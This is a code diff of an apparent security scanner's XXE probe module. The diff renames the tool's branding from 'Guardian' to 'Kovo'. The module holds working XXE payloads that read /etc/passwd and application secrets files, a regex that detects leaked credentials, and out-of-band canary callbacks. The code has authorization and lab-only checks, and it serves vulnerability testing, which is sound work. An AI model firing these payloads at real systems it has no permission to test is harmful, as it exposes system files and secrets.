@@ -8,7 +8,7 @@ import type { DiffContext, DiffOutcome, InjectedRequest } from './context.ts'
 import type { ProbeModule } from './registry.ts'
 
 /**
- * Carry the entity canary token as the broker correlation id (`X-Guardian-Trace-Id` in a local
+ * Carry the entity canary token as the broker correlation id (`X-Kovo-Trace-Id` in a local
  * lab). The durable OOB drain attributes a late callback to the recorded exchange that names the
  * token; the persisted response body does not contain it, and request bodies are not searchable.
  */
@@ -43,19 +43,19 @@ export async function diffXxeCanary(
     validateXxeCustomPayload(req.customPayload)
   }
   if (!canaryBroker) {
-    return { verdict: 'inconclusive', summary: 'CanaryBroker is unavailable; XXE OOB probing needs a Guardian-operated listener.', details: {} }
+    return { verdict: 'inconclusive', summary: 'CanaryBroker is unavailable; XXE OOB probing needs a Kovo Hunter-operated listener.', details: {} }
   }
   let info = canaryBroker.listenerInfo()
   if (!info.running) info = await canaryBroker.startListener()
   const base = info.effectiveBaseUrl
-  const localLab = Boolean(grant.allowLocalLab && process.env.GUARDIAN_ALLOW_LOCAL_LAB === '1')
+  const localLab = Boolean(grant.allowLocalLab && process.env.KOVO_ALLOW_LOCAL_LAB === '1')
   if (base) {
     let host = ''
     try { host = new URL(base).hostname } catch { /* handled below */ }
     if (!host || (isPrivateOrLoopbackHost(host) && !localLab)) {
       return {
         verdict: 'inconclusive',
-        summary: 'Canary base URL is private/loopback; configure GUARDIAN_CANARY_PUBLIC_URL before XXE callback probing on a public target.',
+        summary: 'Canary base URL is private/loopback; configure KOVO_CANARY_PUBLIC_URL before XXE callback probing on a public target.',
         details: { canaryHost: host },
       }
     }
@@ -63,7 +63,7 @@ export async function diffXxeCanary(
 
   const method = req.method && req.method !== 'GET' ? req.method : 'POST'
   const xmlHeaders = { 'Content-Type': 'application/xml', ...(req.headers ?? {}) }
-  const ctrlBody = `<?xml version="1.0" encoding="UTF-8"?><guardian><ping>${randToken(6)}</ping></guardian>`
+  const ctrlBody = `<?xml version="1.0" encoding="UTF-8"?><kovo><ping>${randToken(6)}</ping></kovo>`
   const ctrlEx = await send({ method, pathAndQuery: req.pathAndQuery, body: ctrlBody, headers: xmlHeaders, session: req.session, csrfBind: req.csrfBind })
   if (!ctrlEx) return { verdict: 'inconclusive', summary: 'XXE control request failed.', details: {} }
 
@@ -120,7 +120,7 @@ export async function diffXxeCanary(
   let inbandHit = false
   const resolvedMarkers = /root:x:0:0:|API_KEY=rbs_[a-z0-9]+_[0-9a-f]{12}|SESSION_SECRET=/
   const inbandBody = (entity: string) =>
-    `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY gx SYSTEM "${entity}">]><root><project/><note>&gx;</note><issuer>guardian-issuer</issuer></root>`
+    `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY gx SYSTEM "${entity}">]><root><project/><note>&gx;</note><issuer>kovo-issuer</issuer></root>`
   for (const entity of ['file:///etc/passwd', 'file:///app/config/secrets.env']) {
     const ctrl = await send({ method, pathAndQuery: req.pathAndQuery, body: inbandBody('file:///app/.env'), headers: xmlHeaders, session: req.session, csrfBind: req.csrfBind })
     const probe = await send({ method, pathAndQuery: req.pathAndQuery, body: inbandBody(entity), headers: xmlHeaders, session: req.session, csrfBind: req.csrfBind })
